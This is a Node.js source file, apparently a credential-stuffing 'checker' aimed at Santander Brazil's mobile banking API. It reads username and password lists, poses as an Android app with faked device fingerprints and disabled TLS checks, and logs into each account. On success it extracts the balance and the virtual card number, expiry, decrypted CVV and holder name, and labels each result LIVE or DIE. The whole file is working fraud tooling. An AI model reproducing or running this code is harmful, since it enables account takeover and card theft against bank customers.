const fs = require('fs');
const readline = require('readline');
const { Worker, WorkerData } = require('worker_threads');
var vir = require('./Virtual.js').vir;
//import vir from './Virtual.js';
var execSync = require('child_process').execSync, child;

var unirest = require('unirest');

var creditos = "Feito por thequeen, fornecido pro charlão";
let f23050c = null;

const args = process.argv.slice(2);

var fileName = args[0];
if (fileName != undefined) {
    console.log('fileName', fileName);
    fs.open(fileName, 'r', function(err, fd) {
        if (err == null) {
            const fileStream = fs.createReadStream(fileName);
            var lista = [];
            const rl = readline.createInterface({
                input: fileStream,
                crlfDelay: Infinity
            });
    
            rl.on('line', function (line) {
                console.log('Line from file: ', line);
                lista.push(line);
            })
            .on('close', function(line) {
                console.log("number of lines ", lista.length);
                if(lista.length % 11 == 0) {
    
                } else if (lista.length % 10 == 0) {
                    
                } else if (lista.length % 9 == 0) {
                    
                } else if (lista.length % 8 == 0) {
                    
                } else if (lista.length % 7 == 0) {
                    
                } else if (lista.length % 6 == 0) {
                    
                } else if (lista.length % 5 == 0) {
                    
                } else if (lista.length % 4 == 0) {
                    
                } else {
                    despacharThread(lista, 1);
                } 
            });
        } else {
            console.log('Desculpe certifique-se de que o arquivo existe');
        }
    });
}

const runThread = (subList) => {
    return new Promise((resolve, reject) => {
        const worker = new Worker('./thequeen/MyThread.js', { workerData: subList });
        worker.once('message', result => {
            console.log('message', result);
        });
        worker.on('error', err => {
            console.log(err);
        });
        worker.on('exit', (code) => {
            if (code != 0)
                reject(new Error(`stopped with ${code} exit code`));
        })
    });
}

const despacharThread = async (lista, num) => {
    var comeco = 0;
    var fatia = lista.length / num;
    console.log('lista.length', lista.length);
    for(var i = 0 ; i < num; i++) {
        const result = await runThread(lista.slice(comeco, comeco + fatia));
        comeco += fatia;
    }
}

  class userLoginPayload {
    constructor() {
      this.documentNumber = null;
      this.appVersion = null;
      this.appVersionCode = null;
      this.deviceSystemName = null;
    }
  }

function getAlphaNumericString(n) {
    const alphaString = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvxyz';
    let sb = [];
    for(let i = 0 ;i < n ; i++) {
        let index = alphaString.length * Math.random();
        sb.push(alphaString.charAt(index));
    }
    return sb;
}

function transmitCard(ex, token, v) {
    let cards = v.puxarCartoes();
    let retorno = "";
    cards.forEach(vv => {
        if (vv['hasVirtualCard']) {
            try {
                let a = v.gerarVirtual(v.index,f23050c);
                let data = JSON.parse(a);
                if (a.indexOf('3333333333333333') == -1) {
                    let stdout = execSync('java -jar app.jar mo12438a ' + data['cvv'] + ' ' + f23050c);
                    data['cvv'] = stdout.toString();
                    console.log('data.cvv', data['cvv']);
                    let cc = "NUMERO: " + data['cardNumber'] + " | VALIDADE: " + data['dueDate'] + " | CVV: " + data['cvv'] + " | NOME: " + data['ownerName'] + " | LIMITE DISPONIVEL: " + v.limites(cartao.lastDigits) + "\n";
                    retorno += cc;
                }
            } catch (e) {

            }
        }
    })
    return retorno;
}

const login = async (username, password, action, loginResultProcess) => {
    let pubKey = null;
    let privKey = null;
    let stdout = null;
    stdout = execSync('java -jar app.jar mo12430e');
    stdout = stdout.toString();
    //console.log('stdout', stdout);

    pubKey = stdout.split(',')[0];
    privKey = stdout.split(',')[1];

    privKey = "MIIBZwIBADCCARsGCSqGSIb3DQEDATCCAQwCgYEA9PdryUu8oFidM5DQJa6OKkCL4Fy+nBsmelGwzcIqsVnHB/zwoIifI1bikQ3NWnFeB21fOc09S0HEEVHjFXwM2XodYUNV6cfRGFHKYFGlJlC93U5AkBNA4o8VzXiaeVCVW1V8ipS6WAvJlaM4GN08xVjQr0yaMkE7yRD4VjjM67sCgYEAyJ9xBXfGH6NJkccYvWgJtXeOoSiLDJqgoCVcQzldDCHv4kG6UgRPPUWzxPgZanQYW/dcQSQII3rjaxRXilgA40AqN/G/6uF1m7Q3tuOyLZwamZ7PMfOd35+vVP2m4kaEjxxNu1hfnaFyhLqTbe6nzYrrTllj0pYfBsodeRLzyScCAgIABEMCQQCiGXgx88CPNbzFFSqTPDJ4niYfYkLh2oMSxI16Hl+wgrlVolX+CNZ7QOGqT+LBeJ5lrz/m5eU8yDqMJwW1AW6M";
    pubKey = "308201a63082011b06092a864886f70d0103013082010c02818100f4f76bc94bbca0589d3390d025ae8e2a408be05cbe9c1b267a51b0cdc22ab159c707fcf0a0889f2356e2910dcd5a715e076d5f39cd3d4b41c41151e3157c0cd97a1d614355e9c7d11851ca6051a52650bddd4e40901340e28f15cd789a7950955b557c8a94ba580bc995a33818dd3cc558d0af4c9a32413bc910f85638ccebbb02818100c89f710577c61fa34991c718bd6809b5778ea1288b0c9aa0a0255c43395d0c21efe241ba52044f3d45b3c4f8196a74185bf75c412408237ae36b14578a5800e3402a37f1bfeae1759bb437b6e3b22d9c1a999ecf31f39ddf9faf54fda6e246848f1c4dbb585f9da17284ba936deea7cd8aeb4e5963d2961f06ca1d7912f3c927020202000381840002818011822df7d38f51c78c0810931c2bdb0c88ae30dd61436ca0b832a6a332137752b1c9de9de14f3fda2c80a6d385b5d82b21579888a372db2997cc139ab3faa158f752fab6d2bc747e42d185f056790a3e304608e43014948c56d0a82ffed6bf78ba26dc77d1694d1a4652a73fd08eb722ac81fa478c46601ae5b7d279a98d4bd2";

    
    let nonce = null;
    let serverDLBv1 = null;

    await unirest
    .post('https://m.santander.com.br/key-exchange/v1/exchange')
    .strictSSL(false)
    .headers({'Accept': 'application/json', 'Content-Type': 'application/json'})
    .send({ "dlbClientKey": pubKey})
    .then((response) => {
        console.log('response', response.body);
        nonce = response.body["nonce"];
        serverDLBv1 = response.body["serverDLBv1"];
        console.log('nonce', nonce);
        console.log('serverDLv1', serverDLBv1);
    })
    .catch(err => {
        console.log(err);
        loginResultProcess(action, "error");
    })
    
    stdout = execSync('java -jar app.jar mo12427f ' + serverDLBv1 + ' ' + privKey);
    stdout = stdout.toString();
    stdout = stdout.replace(/[\n\r]/g, '');
    console.log('stdout0', stdout);
    f23050c = stdout;

    stdout = execSync('java -jar app.jar mo12438a ' + nonce + ' ' + f23050c);
    stdout = stdout.toString();
    stdout = stdout.replace(/[\n\r]/g, '');
    console.log('stdout1', stdout);
    let exchangeDecrypted = stdout;

    let ex = JSON.parse(exchangeDecrypted);
    let userPayload = new userLoginPayload();
    userPayload.appVersion = "12.8.0.0";
    userPayload.appVersionCode = "100221";
    userPayload.deviceSystemName = "ANDROID";
    userPayload.documentNumber = username;
    let userPayloadJSON = JSON.stringify(userPayload);
    console.log('userPayloadJSON', userPayloadJSON);
    let authorization = Buffer.from(ex['contextId'] + ":" + ex['token']);
    console.log('authorization', authorization);
    console.log('userPayloadJON String', userPayloadJSON.toString());
    stdout = execSync('java -jar app.jar mo12433c ' + userPayloadJSON.toString() + ' ' + f23050c);
    let body = stdout.toString();
    body = body.replace(/[\n\r]/g, '');
    console.log('stdout2', body);
    let token = null;
    await unirest
        .post('https://m.santander.com.br/settings/v1/check')
        .strictSSL(false)
        .headers({'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authorization.toString('base64'),
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
            'versao-mbb' : '12.1.0.0',
            'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'})
        .send(body)
        .then((response) => {
            token = response.headers['access-token'];
            console.log('token', token);
        })

    let tokenb = Buffer.from(token, 'base64');
    let token2 = tokenb.toString();
    let ts = Date.now();
    let token3 = null;
    let response3 = null;
    authorization = Buffer.from(ex['contextId'] + ":" + token2);
    stdout = execSync('java -jar app.jar mo12433c ' + '{\"deviceId\":\"' + getAlphaNumericString(43) + '\",\"lastPasswordChangeDate\":\"\",\"deviceInfo\":{\"CellTowerId\":\"47108\",\"DeviceSystemVersion\":\"31\",\"SDK_VERSION\":\"3.6.0\",\"DeviceName\":\"null\",\"WiFiMacAddress\":\"02:00:00:00:00:00\",\"RSA_ApplicationKey\":\"null\",\"Emulator\":0,\"MNC\":\"260\",\"LocationAreaCode\":\"8514\",\"PhoneNumber\":\"-1\",\"OS_ID\":\"null\",\"MultitaskingSupported\":true,\"Languages\":\"en\",\"DeviceModel\":\"SAMSUNG\",\"GeoLocationInfo\":[{\"Status\":\"0\",\"Timestamp\":\"' + ts.toString() + '\",\"Latitude\":\"0\",\"Longitude\":\"1\"}],\"DeviceSystemName\":\"Android\",\"Compromised\":0,\"ScreenSize\":\"1080x1794\",\"WiFiNetworksData\":{\"Channel\":\"null\",\"SignalStrength\":\"-50\"},\"MCC\":\"310\",\"SIM_ID\":\"-1\",\"HardwareID\":\"null\"}}' + ' ' + f23050c);
    body = stdout.toString();
    body = body.replace(/[\n\r]/g, '');
    console.log('stdout0', body);

    await unirest
        .post('https://m.santander.com.br/user/v1/check')
        .strictSSL(false)
        .headers({'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authorization.toString('base64'),
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
            'versao-mbb' : '12.1.0.0',
            'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'})
        .send(body)
        .then((response) => {
            response3 = response;
            token3 = response.headers['access-token'];
            console.log('token3', token3);
        })

    let tokenb2 = Buffer.from(token3, 'base64');
    let token4 = tokenb2.toString();
    let token5 = null;
    let response4 = null;
    stdout = execSync('java -jar app.jar mo12433c_senha ' + password + ' ' + f23050c);
    let body1 = stdout.toString();
    body1 = body1.replace(/[\n\r]/g, '');
    console.log('stdout1', body1);
    
    console.log('authorization0',ex['contextId'] + ":" + token4);
    authorization = Buffer.from(ex['contextId'] + ":" + token4);
    let tmp = '{\"password\":\"' + body1 + '\",\"touchIdIntent\":\"none\",\"deviceInfo\":{\"HardwareID\":\"' + getAlphaNumericString(43) + '\",\"SIM_ID\":\"-1\",\"PhoneNumber\":\"-1\",\"GeoLocationInfo\":[{\"Longitude\":\"0\",\"Latitude\":\"0\",\"HorizontalAccuracy\":\"5\",\"Altitude\":\"5\",\"AltitudeAccuracy\":\"5\",\"Timestamp\":\"' + ts.toString() + '\",\"Heading\":\"0\",\"Speed\":\"0\",\"Status\":\"0\"}],\"DeviceModel\":\"SAMSUNG\",\"MultitaskingSupported\":true,\"DeviceName\":\"SAMSUNG\",\"DeviceSystemName\":\"Android\",\"DeviceSystemVersion\":\"31\",\"Languages\":\"en\",\"WiFiMacAddress\":\"02:00:00:00:00:00\",\"WiFiNetworksData\":{\"BBSID\":\"00:13:10:85:fe:01\",\"SignalStrength\":\"-50\",\"Channel\":\"null\",\"SSID\":\"AndroidWifi\"},\"CellTowerId\":\"0\",\"LocationAreaCode\":\"0\",\"ScreenSize\":\"1080x1794\",\"RSA_ApplicationKey\":\"' + getAlphaNumericString(32) + '\",\"MCC\":\"0\",\"MNC\":\"0\",\"OS_ID\":\"null\",\"SDK_VERSION\":\"3.6.0\",\"Compromised\":0,\"Emulator\":0,\"FrontCameraAvailable\":false},\"santanderIdEnabled\":false,\"sddData\":\"\"}';
    console.log('tmp', tmp);

    stdout = execSync('java -jar app.jar mo12433c ' + tmp + ' ' + f23050c);
    body = stdout.toString();
    body = body.replace(/[\n\r]/g, '');
    console.log('stdout2', body);

    try {
        await unirest
        .post('https://m.santander.com.br/user-auth/v1/authenticate')
        .strictSSL(false)
        .headers({'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authorization.toString('base64'),
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
            'versao-mbb' : '12.1.0.0',
            'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'})
        .send(body)
        .then((response) => {
            console.log('response.headers', response.headers);
            console.log('reaponse.body', response.body);
            token5 = response.headers['access-token'];
            console.log('token5', token5);
            response4 = response;
        })

        let tokenb3 = Buffer.from(token5, 'base64');
        let token6 = tokenb3.toString();

        let v = new vir(ex, token6);

        console.log('v', v);
        let puxarSaldo = await v.puxarSaldo(f23050c);
        
        console.log('puxarSaldo', puxarSaldo);

        stdout = execSync('java -jar app.jar mo12438a ' + puxarSaldo + ' ' + f23050c);
        let saldoJsontext = stdout.toString();
        saldoJsontext = saldoJsontext.replace(/[\n\r]/g, '');
        console.log('saldoJsontext', saldoJsontext);

        let saldo = JSON.parse(saldoJsontext);
        let cards = transmitCard(ex, token6, v);

        stdout = execSync('java -jar app.jar mo12438a ' + response4.body + ' ' + f23050c);
        let myjson = stdout.toString();
        myjson = myjson.replace(/[\n\r]/g, '');
        console.log('myjson', myjson);
        let liveObj = JSON.parse(myjson);
        loginResultProcess(action, cards + "LIVE|" + liveObj['santanderIdEnabling']['action'] + "  SALDO + CHEQUE ESPECIAL: " + saldo['accountBalances'][0]['availableBalancePlusOverdraft']);
    } catch (e) {
        console.log('error', e);
        stdout = execSync('java -jar app.jar mo12438a ' + response3.body + ' ' + f23050c);
        let myjson2 = stdout.toString();
        myjson2 = myjson2.replace(/[\n\r]/g, '');
        console.log('myjson2', myjson2);
        let dieObj = JSON.parse(myjson2);
        loginResultProcess(action, "DIE|" + dieObj['message']);
    }
}

module.exports = { login };